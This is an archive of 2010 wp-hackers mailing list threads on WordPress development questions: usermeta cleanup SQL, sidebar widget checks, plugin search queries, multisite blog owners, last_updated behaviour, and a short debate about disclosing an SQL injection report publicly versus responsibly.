Message-ID: <AANLkTi=GbKrw+CEJD6LTft0CwyiVp8v4Prx93tHEffhL@mail.gmail.com>

Hi all,

Is there an easy way I can remove useless user meta from the wp_usermeta
table, and stop it from being put there for new signups?

Almost all of our users have no need for data like 'rich_editing',
'comment_shortcuts', 'admin_color', 'aim', 'yim' or 'jabber'.

I've already disabled the 'aim', 'yim' and 'jabber' contact fields, so these
aren't being created now. However, I think WordPress should only create the
other mentioned fields if the user has the capability to edit posts or
moderate comments. It's creating two unnecessary usermeta entries for each
user.

In the meantime, is there a filter I can use to stop this usermeta from
being created at user creation? And then perhaps only be set if the user
explicitly sets that option in the admin panel?

Cheers,
-- Alex

From mikeschinkel at newclarity.net  Fri Oct  8 03:20:26 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 7 Oct 2010 23:20:26 -0400
Subject: [wp-hackers] Remove useless usermeta
In-Reply-To: <AANLkTi=GbKrw+CEJD6LTft0CwyiVp8v4Prx93tHEffhL@mail.gmail.com>
References: <AANLkTi=GbKrw+CEJD6LTft0CwyiVp8v4Prx93tHEffhL@mail.gmail.com>
Message-ID: <052E05C0-D836-45C9-9F55-571EDB9BD7DB@newclarity.net>

On Oct 7, 2010, at 10:29 PM, Alex Hempton-Smith wrote:
> Is there an easy way I can remove useless user meta from the wp_usermeta
> table, and stop it from being put there for new signups?
> 
> Almost all of our users have no need for data like 'rich_editing',
> 'comment_shortcuts', 'admin_color', 'aim', 'yim' or 'jabber'.
> 
> I've already disabled the 'aim', 'yim' and 'jabber' contact fields, so these
> aren't being created now. However, I think WordPress should only create the
> other mentioned fields if the user has the capability to edit posts or
> moderate comments. It's creating two unnecessary usermeta entries for each
> user.
> 
> In the meantime, is there a filter I can use to stop this usermeta from
> being created at user creation? And then perhaps only be set if the user
> explicitly sets that option in the admin panel?


This SQL will get rid of them using this SQL:

DELETE FROM wp_usermeta 
WHERE AND meta_key IN ('rich_editing','comment_shortcuts', 'admin_color', 'aim', 'yim', 'jabber') 
AND TRIM(IFNULL(meta_value,''))=''

Then you can either "update_user_meta" to delete right after inserted (since there is not a direct way to abort the insert) or you can try the "query" hook using regular expressions to match the appropriate replace "INSERT {$wpdb->usermeta} SET..." queries with something benign like "SELECT 0".

Hope this helps.

-Mike


From ashishsainiashfame at gmail.com  Fri Oct  8 12:03:58 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Fri, 8 Oct 2010 17:33:58 +0530
Subject: [wp-hackers] Adjacent post is affected by the query
In-Reply-To: <AANLkTi=pxqWyYD1caWf6Gc6qwA1LGSq059GiS1aL07rO@mail.gmail.com>
References: <AANLkTi=3WmpcYm4wDCS7xi3xr_bFNorC-XuJtd+EqqbA@mail.gmail.com>
	<AANLkTi=pxqWyYD1caWf6Gc6qwA1LGSq059GiS1aL07rO@mail.gmail.com>
Message-ID: <AANLkTim5QM8XxZ2o8pN4VEPUBKmvK5dmsSzHsM+__pEi@mail.gmail.com>

Thanks a lot! :) #blamenacin ;)

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Tue, Oct 5, 2010 at 2:59 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Mon, Oct 4, 2010 at 5:16 PM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > Hello,
> >
> > When I try to execute a query on my own table by fetching the post ID
> from
> > the post global, then the same query is in effect on the adjacent post
> too.
> > I have seen this thing before but Googling didn't turn up anything. I
> think
> > it has something to do with the navigation links (previous and next
> post).
>
>
> It's your browser prefetching the next post.
>
> http://core.trac.wordpress.org/ticket/12603
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ashishsainiashfame at gmail.com  Fri Oct  8 12:09:41 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Fri, 8 Oct 2010 17:39:41 +0530
Subject: [wp-hackers] Blog Owner in a Multisite
Message-ID: <AANLkTikJrJSn6VhrLjzQv_XswZDPpW-fXQMJhY5r-Hdi@mail.gmail.com>

Hey everyone!

I am trying to get a list of the blog owners sorted by the total pageviews
on all their blogs and show the number of blogs and total pageviews of all
their blogs next to their name.

I have build up an array which holds the pageviews of each blog on network
with the blog id as they key.
But now the question is how do I get to the blog owner of a particular blog
from the blog id so that I can aggregate the data for users?

Comments or suggestions are welcome! :)

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame

From dragonfly at dragonflyeye.net  Fri Oct  8 12:20:36 2010
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Fri, 8 Oct 2010 08:20:36 -0400
Subject: [wp-hackers] Odd last_updated Behavior
Message-ID: <AANLkTikkE-p+cuYXw3Z_ERdPjLiE_bTD+OxuoFb80s4x@mail.gmail.com>

It seems like, since switching from WPMU to WP3.0, the meaning of
"last_updated" in the wp-blogs table has changed. Previously, the
last_updated value was only changed when a new article was posted or
updated. This makes sense because when you want to display a list of the
most recently-posted articles across a multi-blog site, the most convenient
way to do so would be to check this table, as indeed get_last_updated does.

Now as I look at ms-blogs.php, it looks as though any change to the site at
all includes updating this value.  There are three functions that refer to
this field in the database that I can find: wpmu_update_blogs_date,
update_blog_details and update_blog_status. It looks like the old MU
function is about to get axed in favour of update_blog_details, but this
one, like update_blog_status, seems to be a general-use function having
nothing to do with publishing (the old MU function only hooks into the
publishing hooks), which means this behavior is about to be permanently
codified.

Is this intentional on the part of the main developers, or no? Its a pretty
radical alteration of the way the system functions and leaves us multi-blog
users without a direct API method for cleanly getting the most recent posts
from each blog.

From dvmorris at gmail.com  Fri Oct  8 15:55:14 2010
From: dvmorris at gmail.com (David Morris)
Date: Fri, 8 Oct 2010 10:55:14 -0500
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
Message-ID: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>

Is there an easy way to check if a sidebar contains widgets before
displaying it?

Thanks,
Dave

From philip at frumph.net  Fri Oct  8 15:59:12 2010
From: philip at frumph.net (Philip M. Hofer (Frumph))
Date: Fri, 8 Oct 2010 08:59:12 -0700
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
In-Reply-To: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>
References: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>
Message-ID: <C20B9BD0169B497DAB4C4F42F78615A1@frumph.net>

the function is_active_sidebar('sidebarname') can be used, it returns true 
if there's a widget inside and active inside

if (is_active_sidebar('footer')) get_sidebar('footer');


----- Original Message ----- 
From: "David Morris" <dvmorris at gmail.com>
To: <wp-hackers at lists.automattic.com>
Sent: Friday, October 08, 2010 8:55 AM
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets


> Is there an easy way to check if a sidebar contains widgets before
> displaying it?
>
> Thanks,
> Dave
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 



From dhanu80 at gmail.com  Fri Oct  8 16:02:00 2010
From: dhanu80 at gmail.com (Dhanushka Samarakoon)
Date: Fri, 8 Oct 2010 11:02:00 -0500
Subject: [wp-hackers] search_query in a plugin
Message-ID: <AANLkTikCMU+VYN-1RLST6j5rDqQXcAAM=9j7WOEz74f2@mail.gmail.com>

Hi,
The following piece of code works inside a template file.
    <?php
         $search_query = new WP_Query();
         $search_posts = $search_query->query('s=computer');
         echo sizeof($search_posts);
    ?>
But it doesn't work inside a plugins php file. Does anyone know what changes
I should make to get that piece of code work inside a plugin?
Thanks.

From mail at scribu.net  Fri Oct  8 16:27:08 2010
From: mail at scribu.net (scribu)
Date: Fri, 8 Oct 2010 19:27:08 +0300
Subject: [wp-hackers] search_query in a plugin
In-Reply-To: <AANLkTikCMU+VYN-1RLST6j5rDqQXcAAM=9j7WOEz74f2@mail.gmail.com>
References: <AANLkTikCMU+VYN-1RLST6j5rDqQXcAAM=9j7WOEz74f2@mail.gmail.com>
Message-ID: <AANLkTik_oCxg_ESW2P=BaHzzpDein9vSEiLUQvT7Zxpo@mail.gmail.com>

On Fri, Oct 8, 2010 at 7:02 PM, Dhanushka Samarakoon <dhanu80 at gmail.com>wrote:

> Hi,
> The following piece of code works inside a template file.
>    <?php
>         $search_query = new WP_Query();
>         $search_posts = $search_query->query('s=computer');
>         echo sizeof($search_posts);
>    ?>
> But it doesn't work inside a plugins php file. Does anyone know what
> changes
> I should make to get that piece of code work inside a plugin?
> Thanks.
>

This is really more of a support question.

Add this line to wp-config.php and you should see an error message:

define('WP_DEBUG', true);

Also, that code is equivalent to:

$search_posts = get_posts( 's=computer' );
echo count($search_posts);

From mail at scribu.net  Fri Oct  8 16:33:36 2010
From: mail at scribu.net (scribu)
Date: Fri, 8 Oct 2010 19:33:36 +0300
Subject: [wp-hackers] Blog Owner in a Multisite
In-Reply-To: <AANLkTikJrJSn6VhrLjzQv_XswZDPpW-fXQMJhY5r-Hdi@mail.gmail.com>
References: <AANLkTikJrJSn6VhrLjzQv_XswZDPpW-fXQMJhY5r-Hdi@mail.gmail.com>
Message-ID: <AANLkTinR5UTezyChWdbp3GEYjpreT3b9uLAggxtWawyn@mail.gmail.com>

On Fri, Oct 8, 2010 at 3:09 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> I have build up an array which holds the pageviews of each blog on network
> with the blog id as they key.
> But now the question is how do I get to the blog owner of a particular blog
> from the blog id so that I can aggregate the data for users?
>

It really depends on how you define a blog owner. Is it the administrator or
what?

From ashishsainiashfame at gmail.com  Fri Oct  8 16:43:45 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Fri, 8 Oct 2010 22:13:45 +0530
Subject: [wp-hackers] Blog Owner in a Multisite
In-Reply-To: <AANLkTinR5UTezyChWdbp3GEYjpreT3b9uLAggxtWawyn@mail.gmail.com>
References: <AANLkTikJrJSn6VhrLjzQv_XswZDPpW-fXQMJhY5r-Hdi@mail.gmail.com>
	<AANLkTinR5UTezyChWdbp3GEYjpreT3b9uLAggxtWawyn@mail.gmail.com>
Message-ID: <AANLkTi=q0kMig5Stb59YHi_bFMh+qVqMZWoz3ggZ9_nG@mail.gmail.com>

Ah yes I was thinking its just user with capabilities.
Lets say if someone sign up for a blog and then he will be the administrator
and I want this user to be called as the blog owner.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Fri, Oct 8, 2010 at 10:03 PM, scribu <mail at scribu.net> wrote:

> On Fri, Oct 8, 2010 at 3:09 PM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > I have build up an array which holds the pageviews of each blog on
> network
> > with the blog id as they key.
> > But now the question is how do I get to the blog owner of a particular
> blog
> > from the blog id so that I can aggregate the data for users?
> >
>
> It really depends on how you define a blog owner. Is it the administrator
> or
> what?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dvmorris at gmail.com  Fri Oct  8 16:44:30 2010
From: dvmorris at gmail.com (David Morris)
Date: Fri, 8 Oct 2010 11:44:30 -0500
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
In-Reply-To: <C20B9BD0169B497DAB4C4F42F78615A1@frumph.net>
References: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>
	<C20B9BD0169B497DAB4C4F42F78615A1@frumph.net>
Message-ID: <AANLkTikfQEo9w06Vwfwde6ixkgzBWrM_kPQXt32pX7N-@mail.gmail.com>

Hmm, that doesn't seem to be working for me. I have widgets in a sidebar and
I call that function, and it returns false.

I checked into that function, and it does not seem to be able to use the
sidebar name. It checks $sidebars_widgets[$index], and my $sidebars_widgets
array looks like this:

[sidebar-1] => Array
(
            [0] => archives-4
            [1] => text-4
)

[sidebar-2] => Array
(
            [0] => text-3
            [1] => archives-3
)

[sidebar-3] => Array
(

)

When I pass my sidebar's name, it's not getting translated into an ID, so it
looks like the sidebar is never active because it can't find that index.

Dave

On Fri, Oct 8, 2010 at 10:59 AM, Philip M. Hofer (Frumph) <philip at frumph.net
> wrote:

> the function is_active_sidebar('sidebarname') can be used, it returns true
> if there's a widget inside and active inside
>
> if (is_active_sidebar('footer')) get_sidebar('footer');
>
>
> ----- Original Message ----- From: "David Morris" <dvmorris at gmail.com>
> To: <wp-hackers at lists.automattic.com>
> Sent: Friday, October 08, 2010 8:55 AM
> Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
>
>
>  Is there an easy way to check if a sidebar contains widgets before
>> displaying it?
>>
>> Thanks,
>> Dave
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From dvmorris at gmail.com  Fri Oct  8 16:47:05 2010
From: dvmorris at gmail.com (David Morris)
Date: Fri, 8 Oct 2010 11:47:05 -0500
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
In-Reply-To: <AANLkTikfQEo9w06Vwfwde6ixkgzBWrM_kPQXt32pX7N-@mail.gmail.com>
References: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>
	<C20B9BD0169B497DAB4C4F42F78615A1@frumph.net>
	<AANLkTikfQEo9w06Vwfwde6ixkgzBWrM_kPQXt32pX7N-@mail.gmail.com>
Message-ID: <AANLkTi=gdaEmfubyBj=p13sfn9OTak5KoYtAb1MN12sB@mail.gmail.com>

Changing the first line in that function to this works:

                global $wp_registered_sidebars;
 if ( is_int($index) ) {
 $index = "sidebar-$index";
 } else {
 $index = sanitize_title($index);
 foreach ( (array) $wp_registered_sidebars as $key => $value ) {
 if ( sanitize_title($value['name']) == $index ) {
 $index = $key;
 break;
 }
 }
 }

From dhanu80 at gmail.com  Fri Oct  8 19:34:54 2010
From: dhanu80 at gmail.com (Dhanushka Samarakoon)
Date: Fri, 8 Oct 2010 14:34:54 -0500
Subject: [wp-hackers] search_query in a plugin
In-Reply-To: <AANLkTik_oCxg_ESW2P=BaHzzpDein9vSEiLUQvT7Zxpo@mail.gmail.com>
References: <AANLkTikCMU+VYN-1RLST6j5rDqQXcAAM=9j7WOEz74f2@mail.gmail.com>
	<AANLkTik_oCxg_ESW2P=BaHzzpDein9vSEiLUQvT7Zxpo@mail.gmail.com>
Message-ID: <AANLkTikpsWGXQXocu-q08ePYPPJrTF1hz6dUwGqOp=9C@mail.gmail.com>

Thanks for the reply :-)

The count that's been returned by get_posts vs $search_query->query is
different. When I echo my original code I get 8 while when I echo your code
I get only 5.
Is there a difference in how these two perform the searches?


On Fri, Oct 8, 2010 at 11:27 AM, scribu <mail at scribu.net> wrote:

> On Fri, Oct 8, 2010 at 7:02 PM, Dhanushka Samarakoon <dhanu80 at gmail.com
> >wrote:
>
> > Hi,
> > The following piece of code works inside a template file.
> >    <?php
> >         $search_query = new WP_Query();
> >         $search_posts = $search_query->query('s=computer');
> >         echo sizeof($search_posts);
> >    ?>
> > But it doesn't work inside a plugins php file. Does anyone know what
> > changes
> > I should make to get that piece of code work inside a plugin?
> > Thanks.
> >
>
> This is really more of a support question.
>
> Add this line to wp-config.php and you should see an error message:
>
> define('WP_DEBUG', true);
>
> Also, that code is equivalent to:
>
> $search_posts = get_posts( 's=computer' );
> echo count($search_posts);
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dhanu80 at gmail.com  Fri Oct  8 19:42:49 2010
From: dhanu80 at gmail.com (Dhanushka Samarakoon)
Date: Fri, 8 Oct 2010 14:42:49 -0500
Subject: [wp-hackers] search_query in a plugin
In-Reply-To: <AANLkTik_oCxg_ESW2P=BaHzzpDein9vSEiLUQvT7Zxpo@mail.gmail.com>
References: <AANLkTikCMU+VYN-1RLST6j5rDqQXcAAM=9j7WOEz74f2@mail.gmail.com>
	<AANLkTik_oCxg_ESW2P=BaHzzpDein9vSEiLUQvT7Zxpo@mail.gmail.com>
Message-ID: <AANLkTi=SaN-oU3q=1ZAhHzi=DOPWTtQPmCPyXhE=Jwx6@mail.gmail.com>

Also looks like I'm in the wrong mailing list. Thanks for pointing it out.
I looked here (http://codex.wordpress.org/Mailing_Lists) But seems like
there's no support mailing list. Could someone point me in the right
direction?
Thanks.

On Fri, Oct 8, 2010 at 11:27 AM, scribu <mail at scribu.net> wrote:

> On Fri, Oct 8, 2010 at 7:02 PM, Dhanushka Samarakoon <dhanu80 at gmail.com
> >wrote:
>
> > Hi,
> > The following piece of code works inside a template file.
> >    <?php
> >         $search_query = new WP_Query();
> >         $search_posts = $search_query->query('s=computer');
> >         echo sizeof($search_posts);
> >    ?>
> > But it doesn't work inside a plugins php file. Does anyone know what
> > changes
> > I should make to get that piece of code work inside a plugin?
> > Thanks.
> >
>
> This is really more of a support question.
>
> Add this line to wp-config.php and you should see an error message:
>
> define('WP_DEBUG', true);
>
> Also, that code is equivalent to:
>
> $search_posts = get_posts( 's=computer' );
> echo count($search_posts);
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From chip at chipbennett.net  Fri Oct  8 19:48:11 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Fri, 8 Oct 2010 14:48:11 -0500
Subject: [wp-hackers] search_query in a plugin
In-Reply-To: <AANLkTi=SaN-oU3q=1ZAhHzi=DOPWTtQPmCPyXhE=Jwx6@mail.gmail.com>
References: <AANLkTikCMU+VYN-1RLST6j5rDqQXcAAM=9j7WOEz74f2@mail.gmail.com>
	<AANLkTik_oCxg_ESW2P=BaHzzpDein9vSEiLUQvT7Zxpo@mail.gmail.com>
	<AANLkTi=SaN-oU3q=1ZAhHzi=DOPWTtQPmCPyXhE=Jwx6@mail.gmail.com>
Message-ID: <AANLkTi=nXJt9oewuOMZ-X7uT=nTdo_1euZ+-3gh-PAhq@mail.gmail.com>

I'd start here:

http://wordpress.org/support/forum/plugins-and-hacks

<http://wordpress.org/support/forum/plugins-and-hacks>Chip

On Fri, Oct 8, 2010 at 2:42 PM, Dhanushka Samarakoon <dhanu80 at gmail.com>wrote:

> Also looks like I'm in the wrong mailing list. Thanks for pointing it out.
> I looked here (http://codex.wordpress.org/Mailing_Lists) But seems like
> there's no support mailing list. Could someone point me in the right
> direction?
> Thanks.
>
> On Fri, Oct 8, 2010 at 11:27 AM, scribu <mail at scribu.net> wrote:
>
> > On Fri, Oct 8, 2010 at 7:02 PM, Dhanushka Samarakoon <dhanu80 at gmail.com
> > >wrote:
> >
> > > Hi,
> > > The following piece of code works inside a template file.
> > >    <?php
> > >         $search_query = new WP_Query();
> > >         $search_posts = $search_query->query('s=computer');
> > >         echo sizeof($search_posts);
> > >    ?>
> > > But it doesn't work inside a plugins php file. Does anyone know what
> > > changes
> > > I should make to get that piece of code work inside a plugin?
> > > Thanks.
> > >
> >
> > This is really more of a support question.
> >
> > Add this line to wp-config.php and you should see an error message:
> >
> > define('WP_DEBUG', true);
> >
> > Also, that code is equivalent to:
> >
> > $search_posts = get_posts( 's=computer' );
> > echo count($search_posts);
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Fri Oct  8 20:40:45 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 8 Oct 2010 16:40:45 -0400
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
In-Reply-To: <AANLkTi=gdaEmfubyBj=p13sfn9OTak5KoYtAb1MN12sB@mail.gmail.com>
References: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>
	<C20B9BD0169B497DAB4C4F42F78615A1@frumph.net>
	<AANLkTikfQEo9w06Vwfwde6ixkgzBWrM_kPQXt32pX7N-@mail.gmail.com>
	<AANLkTi=gdaEmfubyBj=p13sfn9OTak5KoYtAb1MN12sB@mail.gmail.com>
Message-ID: <AANLkTim+iQu4xqUMu_M=j1u_nzKGbAvkRDQ06veDfbpH@mail.gmail.com>

On Fri, Oct 8, 2010 at 12:47 PM, David Morris <dvmorris at gmail.com> wrote:

> Changing the first line in that function to this works:

<snip>


If that's a bug, care to open a ticket at
http://core.trac.wordpress.org/newticket?

Nacin

From dvmorris at gmail.com  Fri Oct  8 20:53:09 2010
From: dvmorris at gmail.com (David Morris)
Date: Fri, 8 Oct 2010 15:53:09 -0500
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
In-Reply-To: <AANLkTim+iQu4xqUMu_M=j1u_nzKGbAvkRDQ06veDfbpH@mail.gmail.com>
References: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>
	<C20B9BD0169B497DAB4C4F42F78615A1@frumph.net>
	<AANLkTikfQEo9w06Vwfwde6ixkgzBWrM_kPQXt32pX7N-@mail.gmail.com>
	<AANLkTi=gdaEmfubyBj=p13sfn9OTak5KoYtAb1MN12sB@mail.gmail.com>
	<AANLkTim+iQu4xqUMu_M=j1u_nzKGbAvkRDQ06veDfbpH@mail.gmail.com>
Message-ID: <AANLkTi=fr-_0vRyjUKdWBB+Ooq=yaWbQB5u2u-Y1uB5P@mail.gmail.com>

Sure. I'll do that.

On Fri, Oct 8, 2010 at 3:40 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Fri, Oct 8, 2010 at 12:47 PM, David Morris <dvmorris at gmail.com> wrote:
>
> > Changing the first line in that function to this works:
>
> <snip>
>
>
> If that's a bug, care to open a ticket at
> http://core.trac.wordpress.org/newticket?
>
> Nacin
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From dvmorris at gmail.com  Fri Oct  8 20:59:07 2010
From: dvmorris at gmail.com (David Morris)
Date: Fri, 8 Oct 2010 15:59:07 -0500
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
In-Reply-To: <AANLkTi=fr-_0vRyjUKdWBB+Ooq=yaWbQB5u2u-Y1uB5P@mail.gmail.com>
References: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com>
	<C20B9BD0169B497DAB4C4F42F78615A1@frumph.net>
	<AANLkTikfQEo9w06Vwfwde6ixkgzBWrM_kPQXt32pX7N-@mail.gmail.com>
	<AANLkTi=gdaEmfubyBj=p13sfn9OTak5KoYtAb1MN12sB@mail.gmail.com>
	<AANLkTim+iQu4xqUMu_M=j1u_nzKGbAvkRDQ06veDfbpH@mail.gmail.com>
	<AANLkTi=fr-_0vRyjUKdWBB+Ooq=yaWbQB5u2u-Y1uB5P@mail.gmail.com>
Message-ID: <AANLkTi=_0QgFP2p7ROPunqnmQaAHk61+AmQrJ7ZdBj8u@mail.gmail.com>

Here is the ticket: http://core.trac.wordpress.org/ticket/15077

On Fri, Oct 8, 2010 at 3:53 PM, David Morris <dvmorris at gmail.com> wrote:

> Sure. I'll do that.
>
>
> On Fri, Oct 8, 2010 at 3:40 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>
>> On Fri, Oct 8, 2010 at 12:47 PM, David Morris <dvmorris at gmail.com> wrote:
>>
>> > Changing the first line in that function to this works:
>>
>> <snip>
>>
>>
>> If that's a bug, care to open a ticket at
>> http://core.trac.wordpress.org/newticket?
>>
>> Nacin
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Dave Morris
> http://dave.showviz.net/
> http://3dcamphouston.com/
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From wp at andrewnacin.com  Fri Oct  8 21:05:58 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 8 Oct 2010 17:05:58 -0400
Subject: [wp-hackers] Odd last_updated Behavior
In-Reply-To: <AANLkTikkE-p+cuYXw3Z_ERdPjLiE_bTD+OxuoFb80s4x@mail.gmail.com>
References: <AANLkTikkE-p+cuYXw3Z_ERdPjLiE_bTD+OxuoFb80s4x@mail.gmail.com>
Message-ID: <AANLkTim3bGH=pAcjVDhKwwAZ8u81=Hb-28Hj2hUS=nJW@mail.gmail.com>

On Fri, Oct 8, 2010 at 8:20 AM, Thomas Belknap
<dragonfly at dragonflyeye.net>wrote:

> It seems like, since switching from WPMU to WP3.0, the meaning of
> "last_updated" in the wp-blogs table has changed.


Not sure which version of MU you moved from, but I'm told that this behavior
changed somewheres around MU 2.6.

From dragonfly at dragonflyeye.net  Fri Oct  8 22:21:00 2010
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Fri, 8 Oct 2010 18:21:00 -0400
Subject: [wp-hackers] Odd last_updated Behavior
In-Reply-To: <AANLkTim3bGH=pAcjVDhKwwAZ8u81=Hb-28Hj2hUS=nJW@mail.gmail.com>
References: <AANLkTikkE-p+cuYXw3Z_ERdPjLiE_bTD+OxuoFb80s4x@mail.gmail.com>
	<AANLkTim3bGH=pAcjVDhKwwAZ8u81=Hb-28Hj2hUS=nJW@mail.gmail.com>
Message-ID: <AANLkTi=r7VDV3Do-eMLppecFMr9=tKrQZ4Yqx3mSZA9r@mail.gmail.com>

I've never observed this behavior in all the time I've been working with
WPMU and that's quite a while. I'm perusing the code of 2.9.2 at the moment
- the last version I personally downloaded - and I'm not seeing it. Not sure
where the change happened, exactly, or how to find out.

Regardless, somewhere along the line, the meaning of the value has changed.
And the purpose of having a list of most recently-updated blogs that
reflects the most recently published content is pretty straight-forward for
a multi blog environment. In fact, my blog being sort of a "newsie" kind of
thing more or less depends on it to run the front page. I'm much more
concerned with having this functionality and it kind of seems like it should
be a core function.

So, I'm just wondering if this was purposely removed and is there any plan
to replace it with similar functionality - in which case, I shall have to
figure out some alternate method like a plugin.


On Fri, Oct 8, 2010 at 5:05 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Fri, Oct 8, 2010 at 8:20 AM, Thomas Belknap
> <dragonfly at dragonflyeye.net>wrote:
>
> > It seems like, since switching from WPMU to WP3.0, the meaning of
> > "last_updated" in the wp-blogs table has changed.
>
>
> Not sure which version of MU you moved from, but I'm told that this
> behavior
> changed somewheres around MU 2.6.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jason at intraffic.net  Sat Oct  9 01:11:23 2010
From: jason at intraffic.net (Jason Webster)
Date: Fri, 08 Oct 2010 18:11:23 -0700
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL
	Injection	Vulnerability
In-Reply-To: <AANLkTinB=aYt8LYvx0PqqAWdCPGvOyEm+P+FOv5E048t@mail.gmail.com>
References: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
	<AANLkTinB=aYt8LYvx0PqqAWdCPGvOyEm+P+FOv5E048t@mail.gmail.com>
Message-ID: <4CAFC13B.1070404@intraffic.net>



On 06/10/2010 8:20 PM, Andrew Nacin wrote:
> On Wed, Oct 6, 2010 at 1:59 PM, Chuck Harris<charrisjr at gmail.com>  wrote:
>
>> Hello:
>>
>> Any experience with or insight regarding the following would be helpful.
>>
>> Thank you in advance,
>> Chuck Harris
>
>
> In the future, I would have thought it were obvious, but:
> Don't send potential vulnerabilities over a public mailing list or post it
> to a public place.
>
> It should go through the core team at security at wordpress.org.
>
> See also: http://codex.wordpress.org/FAQ_Security.
>

Lame. If it were actually a security problem, individuals can react wayy faster than the core team 
to fix their sites.


From wp at andrewnacin.com  Sat Oct  9 03:15:11 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 8 Oct 2010 23:15:11 -0400
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL Injection
	Vulnerability
In-Reply-To: <4CAFC13B.1070404@intraffic.net>
References: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
	<AANLkTinB=aYt8LYvx0PqqAWdCPGvOyEm+P+FOv5E048t@mail.gmail.com>
	<4CAFC13B.1070404@intraffic.net>
Message-ID: <AANLkTik6=k=0PTmaCBmkCCqzCss_7Y2HQ3PD791+3Q3H@mail.gmail.com>

On Fri, Oct 8, 2010 at 9:11 PM, Jason Webster <jason at intraffic.net> wrote:

> Lame. If it were actually a security problem, individuals can react wayy
> faster than the core team to fix their sites.


That is against the concept of "responsible disclosure" of security
vulnerabilities in *any* software. That is, that the vendor should be first
contacted confidentially, to allow for a timely fix and, if necessary, a new
release.

With regards to who can react faster, I'm not so sure about that. Perhaps
you know enough about core to be able to diagnose, not to mention fix, but
it is a serious disservice to millions of other users. We're concerned about
zero-day exploits, and that turns into a race to fix the vulnerability. Once
it is made public, the cat is out of the bag.

